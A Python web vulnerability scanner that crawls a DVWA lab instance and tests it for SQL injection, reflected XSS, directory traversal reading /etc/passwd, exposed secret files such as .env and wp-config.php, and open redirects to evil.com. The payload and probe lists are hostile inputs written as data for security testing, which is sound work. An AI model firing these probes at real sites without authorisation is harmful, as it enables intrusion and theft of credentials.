# web_vuln_scanner.py

import datetime
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode

# ──────────────────────────────────────────────
# CONFIGURATION
# ──────────────────────────────────────────────
TARGET_URL = "http://192.168.0.158:8080/"
LOGIN_URL  = "http://192.168.0.158:8080/login.php"
USERNAME   = "admin"
PASSWORD   = "password"
MAX_URLS   = 50

# ──────────────────────────────────────────────
# AUTHENTICATION
# ──────────────────────────────────────────────

def login():
    """
    Log into DVWA and return an authenticated session.
    Grabs the CSRF token from the login page first, then submits credentials.
    Retries up to 3 times in case of token timing issues.
    """
    for attempt in range(1, 4):
        session  = requests.Session()
        response = session.get(LOGIN_URL, timeout=10)
        soup     = BeautifulSoup(response.text, "html.parser")
        token_tag = soup.find("input", {"name": "user_token"})

        if not token_tag:
            print(f"[!] Could not find CSRF token (attempt {attempt})")
            continue

        session.post(LOGIN_URL, timeout=10, allow_redirects=True, data={
            "username":   USERNAME,
            "password":   PASSWORD,
            "Login":      "Login",
            "user_token": token_tag["value"]
        })

        verify = session.get("http://192.168.0.158:8080/index.php", timeout=10)
        title  = BeautifulSoup(verify.text, "html.parser").title.string or ""

        if "login" in title.lower():
            print(f"[!] Login attempt {attempt} failed — retrying...")
        else:
            print(f"[*] Logged in as {USERNAME}")
            return session

    print("[!] All login attempts failed — check DVWA is running and credentials are correct")
    return requests.Session()


def is_logged_out(response):
    """Return True if DVWA silently redirected us back to the login page."""
    try:
        return "login" in BeautifulSoup(response.text, "html.parser").title.string.lower()
    except Exception:
        return False

# ──────────────────────────────────────────────
# CRAWLER
# ──────────────────────────────────────────────

def get_all_links(url, session):
    """Fetch a page and return all absolute URLs found on it."""
    try:
        response = session.get(url, timeout=10)
        if is_logged_out(response):
            return set()
        soup  = BeautifulSoup(response.text, "html.parser")
        return {urljoin(url, tag["href"]) for tag in soup.find_all("a", href=True)}
    except requests.RequestException:
        return set()


def get_all_forms(url, session):
    """Fetch a page and return all HTML forms found on it."""
    try:
        response = session.get(url, timeout=10)
        if is_logged_out(response):
            return []
        return BeautifulSoup(response.text, "html.parser").find_all("form")
    except requests.RequestException:
        return []


def crawl(start_url, max_urls=MAX_URLS):
    """
    Log in, crawl the target, and collect all URLs and forms.
    Returns (visited_urls, forms_dict, session).
    """
    session     = login()
    visited     = set()
    to_visit    = {start_url}
    all_forms   = {}
    base_domain = urlparse(start_url).netloc

    print(f"[*] Starting crawl on {start_url}")
    print(f"[*] Staying within domain: {base_domain}\n")

    while to_visit and len(visited) < max_urls:
        url = to_visit.pop()

        if url in visited:
            continue
        if urlparse(url).netloc != base_domain:
            continue
        if "logout" in url:
            continue

        print(f"[+] Crawling: {url}")
        visited.add(url)

        test = session.get(url, timeout=10)
        if is_logged_out(test):
            print("[*] Session expired — re-authenticating...")
            session = login()

        forms = get_all_forms(url, session)
        if forms:
            all_forms[url] = forms
            print(f"    Found {len(forms)} form(s)")

        to_visit.update(get_all_links(url, session) - visited)

    print(f"\n[*] Crawl complete.")
    print(f"    URLs visited    : {len(visited)}")
    print(f"    Pages with forms: {len(all_forms)}")
    return visited, all_forms, session

# ──────────────────────────────────────────────
# FORM HELPERS
# ──────────────────────────────────────────────

def get_form_details(form):
    """Extract action, method, and input fields from a form."""
    return {
        "action": form.attrs.get("action", ""),
        "method": form.attrs.get("method", "get").lower(),
        "inputs": [
            {
                "type":  tag.attrs.get("type", "text"),
                "name":  tag.attrs.get("name"),
                "value": tag.attrs.get("value", "")
            }
            for tag in form.find_all(["input", "textarea", "select"])
            if tag.attrs.get("name")
        ]
    }


def submit_form(form_details, url, payload, session):
    """Submit a form with a payload injected into all text fields."""
    target_url = urljoin(url, form_details["action"])
    data = {
        field["name"]: payload if field["type"] in ("text", "search", "") else field["value"]
        for field in form_details["inputs"]
    }
    if form_details["method"] == "post":
        return session.post(target_url, data=data, timeout=10)
    return session.get(target_url, params=data, timeout=10)

# ──────────────────────────────────────────────
# SQL INJECTION
# ──────────────────────────────────────────────

SQL_PAYLOADS = ["'", '"', "' OR '1'='1", "' OR 1=1--", '" OR 1=1--']

SQL_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sql syntax",
    "mysql_fetch",
    "supplied argument is not a valid mysql",
    "ora-01756",
]


def scan_sqli(url, forms, session):
    """Test all forms on a page for SQL injection vulnerabilities."""
    findings = []
    for form in forms:
        details = get_form_details(form)
        for payload in SQL_PAYLOADS:
            try:
                response = submit_form(details, url, payload, session)
                for error in SQL_ERRORS:
                    if error in response.text.lower():
                        findings.append({"url": url, "payload": payload, "error": error})
                        break
            except requests.RequestException:
                pass
    return findings

# ──────────────────────────────────────────────
# XSS DETECTION
# ──────────────────────────────────────────────

XSS_PAYLOAD = "<script>alert('XSS')</script>"


def scan_xss(url, forms, session):
    """Test all forms on a page for reflected XSS vulnerabilities."""
    findings = []
    for form in forms:
        details = get_form_details(form)
        try:
            response = submit_form(details, url, XSS_PAYLOAD, session)
            if XSS_PAYLOAD in response.text:
                findings.append({
                    "url":    url,
                    "payload": XSS_PAYLOAD,
                    "method": details["method"].upper()
                })
        except requests.RequestException:
            pass
    return findings

# ──────────────────────────────────────────────
# DIRECTORY TRAVERSAL
# ──────────────────────────────────────────────

TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../etc/passwd",
    "../../etc/passwd",
    "../etc/passwd",
    "../../../../etc/passwd%00",
    "....//....//....//etc/passwd",
]

TRAVERSAL_SIGNATURES = [
    "root:x:0:0",
    "root:!:0:0",
    "/bin/bash",
    "/bin/sh",
    "nobody:x:",
]


def scan_traversal(urls, session):
    """Test URL parameters for directory traversal vulnerabilities."""
    findings = []
    for url in urls:
        parsed = urlparse(url)
        if not parsed.query:
            continue
        params = parse_qs(parsed.query, keep_blank_values=True)
        for param_name in params:
            for payload in TRAVERSAL_PAYLOADS:
                test_params = {**params, param_name: [payload]}
                test_url    = parsed._replace(query=urlencode(test_params, doseq=True)).geturl()
                try:
                    response = session.get(test_url, timeout=10)
                    for sig in TRAVERSAL_SIGNATURES:
                        if sig in response.text:
                            findings.append({
                                "url":       url,
                                "parameter": param_name,
                                "payload":   payload,
                                "signature": sig
                            })
                            break
                except requests.RequestException:
                    pass
    return findings

# ──────────────────────────────────────────────
# SENSITIVE FILE EXPOSURE
# ──────────────────────────────────────────────

SENSITIVE_FILES = [
    "/.env", "/config.php", "/wp-config.php", "/.git/config",
    "/backup.sql", "/db.sql", "/admin/config.php", "/phpinfo.php",
    "/server-status", "/.htaccess", "/etc/passwd", "/config/database.yml",
]

SENSITIVE_SIGNATURES = {
    "/.env":                ["DB_PASSWORD", "APP_KEY", "DB_HOST"],
    "/config.php":          ["mysqli_connect", "mysql_connect", "define("],
    "/wp-config.php":       ["DB_NAME", "DB_USER", "table_prefix"],
    "/.git/config":         ["[core]", "repositoryformatversion"],
    "/backup.sql":          ["INSERT INTO", "CREATE TABLE", "DROP TABLE"],
    "/db.sql":              ["INSERT INTO", "CREATE TABLE"],
    "/phpinfo.php":         ["PHP Version", "phpinfo()"],
    "/server-status":       ["Apache Server Status", "requests currently being processed"],
    "/.htaccess":           ["RewriteEngine", "Options", "Allow from"],
    "/etc/passwd":          ["root:x:0:0", "/bin/bash"],
    "/config/database.yml": ["adapter:", "database:", "username:"],
    "/admin/config.php":    ["mysqli_connect", "define("],
}


def scan_sensitive_files(base_url, session):
    """Probe for common sensitive files that should not be publicly accessible."""
    findings = []
    base = f"{urlparse(base_url).scheme}://{urlparse(base_url).netloc}"
    for filepath in SENSITIVE_FILES:
        try:
            response = session.get(base + filepath, timeout=10)
            if response.status_code != 200 or is_logged_out(response):
                continue
            for sig in SENSITIVE_SIGNATURES.get(filepath, []):
                if sig in response.text:
                    findings.append({
                        "url":       base + filepath,
                        "file":      filepath,
                        "signature": sig,
                        "status":    response.status_code
                    })
                    break
        except requests.RequestException:
            pass
    return findings

# ──────────────────────────────────────────────
# OPEN REDIRECT DETECTION
# ──────────────────────────────────────────────

REDIRECT_PARAMS = [
    "url", "redirect", "redirect_url", "redirect_uri",
    "next", "return", "return_url", "returnurl",
    "goto", "target", "dest", "destination",
    "forward", "location", "continue", "page"
]

REDIRECT_PAYLOAD = "http://evil.com"


def scan_open_redirects(urls, session):
    """Test URL parameters for open redirect vulnerabilities."""
    findings = []
    for url in urls:
        parsed = urlparse(url)
        if not parsed.query:
            continue
        params = parse_qs(parsed.query, keep_blank_values=True)
        for param_name in params:
            if param_name.lower() not in REDIRECT_PARAMS:
                continue
            test_params = {**params, param_name: [REDIRECT_PAYLOAD]}
            test_url    = parsed._replace(query=urlencode(test_params, doseq=True)).geturl()
            try:
                response = session.get(test_url, timeout=10, allow_redirects=False)
                location = response.headers.get("Location", "")
                if REDIRECT_PAYLOAD in location:
                    findings.append({
                        "url":       url,
                        "parameter": param_name,
                        "payload":   REDIRECT_PAYLOAD,
                        "evidence":  f"Location header: {location}"
                    })
                    continue
                soup = BeautifulSoup(response.text, "html.parser")
                for meta in soup.find_all("meta", attrs={"http-equiv": True}):
                    if meta.get("http-equiv", "").lower() == "refresh":
                        content = meta.get("content", "")
                        if REDIRECT_PAYLOAD in content:
                            findings.append({
                                "url":       url,
                                "parameter": param_name,
                                "payload":   REDIRECT_PAYLOAD,
                                "evidence":  f"Meta refresh: {content}"
                            })
            except requests.RequestException:
                pass
    return findings

# ──────────────────────────────────────────────
# REPORT GENERATION
# ──────────────────────────────────────────────

def generate_report(target, visited, sqli, xss, traversal, sensitive, redirects):
    """Generate a timestamped vulnerability report and save it to a file."""
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename  = f"report_{timestamp}.txt"
    total     = len(sqli) + len(xss) + len(traversal) + len(sensitive) + len(redirects)

    lines = [
        "=" * 60,
        "        WEB VULNERABILITY SCANNER — REPORT",
        "=" * 60,
        f"  Target        : {target}",
        f"  Scanned       : {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        f"  URLs Found    : {len(visited)}",
        f"  Total Findings: {total}",
        "=" * 60,
        "\n[ SUMMARY ]\n",
        f"  {'Vulnerability':<30} {'Findings':>8}",
        f"  {'-'*30} {'-'*8}",
        f"  {'SQL Injection':<30} {len(sqli):>8}",
        f"  {'Cross-Site Scripting (XSS)':<30} {len(xss):>8}",
        f"  {'Directory Traversal':<30} {len(traversal):>8}",
        f"  {'Sensitive File Exposure':<30} {len(sensitive):>8}",
        f"  {'Open Redirect':<30} {len(redirects):>8}",
        f"  {'-'*30} {'-'*8}",
        f"  {'TOTAL':<30} {total:>8}",
    ]

    def section(title, findings, fields):
        lines.append(f"\n\n[ {title} ]\n")
        if not findings:
            lines.append(f"  No {title.lower()} found.")
            return
        for i, f in enumerate(findings, 1):
            for label, key in fields:
                prefix = f"  [{i}]" if label == fields[0][0] else "      "
                lines.append(f"{prefix} {label:<10}: {f[key]}")
            lines.append("")

    section("SQL INJECTION FINDINGS",       sqli,      [("URL", "url"), ("Payload", "payload"), ("Error", "error")])
    section("XSS FINDINGS",                 xss,       [("URL", "url"), ("Payload", "payload"), ("Method", "method")])
    section("DIRECTORY TRAVERSAL FINDINGS", traversal, [("URL", "url"), ("Parameter", "parameter"), ("Payload", "payload"), ("Signature", "signature")])
    section("SENSITIVE FILE EXPOSURE",      sensitive, [("URL", "url"), ("File", "file"), ("Signature", "signature"), ("Status", "status")])
    section("OPEN REDIRECT FINDINGS",       redirects, [("URL", "url"), ("Parameter", "parameter"), ("Payload", "payload"), ("Evidence", "evidence")])

    lines.append("\n[ DISCOVERED URLS ]\n")
    lines.extend(f"  {u}" for u in sorted(visited))
    lines += ["\n" + "=" * 60, "  END OF REPORT", "=" * 60]

    with open(filename, "w") as f:
        f.write("\n".join(lines))

    print(f"\n[*] Report saved to: {filename}")
    return filename

# ──────────────────────────────────────────────
# ENTRY POINT
# ──────────────────────────────────────────────

if __name__ == "__main__":
    visited, forms, session = crawl(TARGET_URL)

    print("\n── Discovered URLs ──")
    for u in sorted(visited):
        print(f"  {u}")

    print("\n── Pages with Forms ──")
    for page_url, page_forms in forms.items():
        print(f"  {page_url} → {len(page_forms)} form(s)")

    # Stage 2: SQL Injection
    print("\n\n══════════════════════════════")
    print("  STAGE 2 — SQL INJECTION SCAN")
    print("══════════════════════════════")
    sqli_findings = []
    for page_url, page_forms in forms.items():
        sqli_findings.extend(scan_sqli(page_url, page_forms, session))

    if sqli_findings:
        print(f"\n[!] Found {len(sqli_findings)} SQL injection vulnerability/vulnerabilities:\n")
        for f in sqli_findings:
            print(f"  URL     : {f['url']}")
            print(f"  Payload : {f['payload']}")
            print(f"  Error   : {f['error']}\n")
    else:
        print("\n[-] No SQL injection vulnerabilities found.")

    # Stage 3: XSS
    print("\n\n══════════════════════════════")
    print("  STAGE 3 — XSS SCAN")
    print("══════════════════════════════")
    xss_findings = []
    for page_url, page_forms in forms.items():
        xss_findings.extend(scan_xss(page_url, page_forms, session))

    if xss_findings:
        print(f"\n[!] Found {len(xss_findings)} XSS vulnerability/vulnerabilities:\n")
        for f in xss_findings:
            print(f"  URL     : {f['url']}")
            print(f"  Payload : {f['payload']}")
            print(f"  Method  : {f['method']}\n")
    else:
        print("\n[-] No XSS vulnerabilities found.")

    # Stage 4a: Directory Traversal
    print("\n\n══════════════════════════════════════")
    print("  STAGE 4a — DIRECTORY TRAVERSAL SCAN")
    print("══════════════════════════════════════")
    traversal_findings = scan_traversal(visited, session)

    if traversal_findings:
        print(f"\n[!] Found {len(traversal_findings)} directory traversal vulnerability/vulnerabilities:\n")
        for f in traversal_findings:
            print(f"  URL       : {f['url']}")
            print(f"  Parameter : {f['parameter']}")
            print(f"  Payload   : {f['payload']}")
            print(f"  Signature : {f['signature']}\n")
    else:
        print("\n[-] No directory traversal vulnerabilities found.")

    # Stage 4b: Sensitive File Exposure
    print("\n\n══════════════════════════════════════")
    print("  STAGE 4b — SENSITIVE FILE EXPOSURE")
    print("══════════════════════════════════════")
    sensitive_findings = scan_sensitive_files(TARGET_URL, session)

    if sensitive_findings:
        print(f"\n[!] Found {len(sensitive_findings)} exposed sensitive file(s):\n")
        for f in sensitive_findings:
            print(f"  URL       : {f['url']}")
            print(f"  File      : {f['file']}")
            print(f"  Signature : {f['signature']}")
            print(f"  Status    : {f['status']}\n")
    else:
        print("\n[-] No sensitive files exposed.")

    # Stage 5: Open Redirects
    print("\n\n══════════════════════════════════════")
    print("  STAGE 5 — OPEN REDIRECT SCAN")
    print("══════════════════════════════════════")
    redirect_findings = scan_open_redirects(visited, session)

    if redirect_findings:
        print(f"\n[!] Found {len(redirect_findings)} open redirect vulnerability/vulnerabilities:\n")
        for f in redirect_findings:
            print(f"  URL       : {f['url']}")
            print(f"  Parameter : {f['parameter']}")
            print(f"  Payload   : {f['payload']}")
            print(f"  Evidence  : {f['evidence']}\n")
    else:
        print("\n[-] No open redirect vulnerabilities found.")

    # Stage 6: Generate Report
    generate_report(
        target    = TARGET_URL,
        visited   = visited,
        sqli      = sqli_findings,
        xss       = xss_findings,
        traversal = traversal_findings,
        sensitive = sensitive_findings,
        redirects = redirect_findings
    )